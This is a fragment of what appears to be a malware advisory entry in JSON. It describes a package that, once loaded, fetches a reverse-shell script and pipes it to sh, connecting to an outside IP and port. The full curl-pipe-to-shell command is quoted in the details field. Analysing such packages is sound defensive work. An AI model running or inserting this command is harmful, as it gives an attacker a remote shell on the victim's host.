  "summary": "Reverse shell dropper fetches and executes remote payload on load",
  "details": "index.js exports a `command` function that runs `/bin/bash -c \"curl https://reverse-shell.sh/10.0.72.234:4444 | sh\"`, fetching a reverse-shell script from reverse-shell.sh and piping it to sh. A companion check.js requires the package and immediately invokes the exported function, so loading the module triggers fetch-and-execute of remote code and opens an interactive shell from the host to 10.0.72.234:4444.",
